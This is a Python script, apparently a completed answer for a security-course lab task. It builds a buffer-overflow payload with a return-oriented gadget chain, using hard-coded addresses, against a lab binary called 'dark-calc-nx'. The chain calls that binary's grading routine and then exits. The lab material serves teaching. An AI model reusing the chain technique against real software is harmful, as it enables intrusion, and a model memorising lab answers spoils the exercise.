#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

payload = b""

POP_RDI = 0x401A33       
RET = 0x401A34           
GRADE_EVAL = 0x401978    
EXIT_PLT = 0x4016E0     

BUFSZ = 16                    

payload = b"A" * (BUFSZ + 8)    
payload += struct.pack("<Q", POP_RDI)
payload += struct.pack("<Q", 4)                
payload += struct.pack("<Q", RET)              
payload += struct.pack("<Q", GRADE_EVAL)
payload += struct.pack("<Q", POP_RDI)         
payload += struct.pack("<Q", 0)
payload += struct.pack("<Q", RET)               
payload += struct.pack("<Q", EXIT_PLT)

sys.stdout.buffer.write(payload)